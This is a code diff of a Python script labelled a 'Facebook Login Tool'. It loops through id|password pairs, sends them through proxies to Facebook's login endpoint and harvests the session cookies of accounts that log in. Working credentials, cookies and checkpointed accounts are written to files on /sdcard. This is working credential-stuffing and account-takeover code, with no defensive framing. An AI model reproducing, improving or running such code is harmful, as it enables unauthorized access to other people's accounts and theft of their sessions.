@@ -8,10 +8,9 @@ try:
 except:
     xvx = ["http://127.0.0.1:8080"]
 
-# Support functions as inline lambdas or direct usage
 logo_text = "🔐 Facebook Login Tool (One ID at a time) 🔐"
 linex = lambda: print('-' * 50)
-check_lock = lambda cid: "live"  # or "locked"
+check_lock = lambda cid: "live"
 
 os.system('clear')
 print(logo_text)
@@ -38,8 +37,7 @@ for user in dx:
 
     try:
         ids, pw = user.split('|')
-        ids = ids.strip()
-        pw = pw.strip()
+        ids, pw = ids.strip(), pw.strip()
     except:
         continue
 
@@ -51,6 +49,7 @@ for user in dx:
         proxs = {'http': nip}
         Session = requests.Session()
         free_fb = Session.get('https://m.facebook.com').text
+
         data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', free_fb).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', free_fb).group(1),
@@ -70,12 +69,7 @@ for user in dx:
         }
 
         cookies = {
-            'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
-            'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
-            'ps_l': '1',
-            'ps_n': '1',
             'locale': 'hi_IN',
-            'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
             'wd': '885x751',
         }
 
@@ -86,42 +80,38 @@ for user in dx:
             'content-type': 'application/x-www-form-urlencoded',
             'origin': 'https://www.facebook.com',
             'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
-            'sec-fetch-mode': 'navigate',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0 Safari/537.36',
         }
 
-        url = 'https://www.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=110'
-        po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
-        response = Session.cookies.get_dict().keys()
+        url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
+        response = Session.post(url, data=data, headers=headers, cookies=cookies, allow_redirects=False)
 
-        if "c_user" in response:
-            cok = Session.cookies.get_dict()
-            cid = cok["c_user"]
-            coki = ";".join([f"{k}={v}" for k, v in cok.items()])
-            check = check_lock(cid)
-            if "live" in check:
+        cookie_data = Session.cookies.get_dict()
+
+        if "c_user" in cookie_data:
+            cid = cookie_data["c_user"]
+            coki = ";".join([f"{k}={v}" for k, v in cookie_data.items()])
+            if "live" in check_lock(cid):
                 if '%3A-1%3A-1' in coki:
                     print(f"\n✅ NV-LOGIN: {cid}|{pw}")
                     open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                 else:
-                    bkas.append(cid)
                     print(f"\n✅ OK: {cid}|{pw}")
                     print(f"🍪 Cookie: {coki}")
                     open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                     oks.append(cid)
-            break
 
-        elif 'checkpoint' in response:
-            uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-            open('/sdcard/ATOM-CP.txt', 'a').write(f'{uid} | {pw}\n')
-            cps.append(uid)
-            break
+        elif 'checkpoint' in cookie_data:
+            print(f"\n⚠️ CHECKPOINT: {ids}|{pw}")
+            open('/sdcard/ATOM-CP.txt', 'a').write(f'{ids}|{pw}\n')
+            cps.append(ids)
 
         else:
-            print(f"\nfail")
-            continue
+            print("\n❌ FAIL: Login not successful.")
 
-        loop += 1
+    except Exception as e:
+        print(f"\n⚠️ ERROR: {e}")
+        time.sleep(2)
 
     linex()
     print("🔚 PROCESS COMPLETE.")
